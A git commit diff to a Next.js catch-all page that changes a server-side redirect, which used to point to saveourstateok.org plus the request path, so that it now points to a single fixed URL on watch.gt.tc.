919ff4e394af82d72ee0b9f367b0e1f1770bb4b2
umer44empire-dot <umer44empire@gmail.com>
2025-10-27 22:51:30 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://watch.gt.tc/a0d0f2`
 				}`,
 			},
 		};
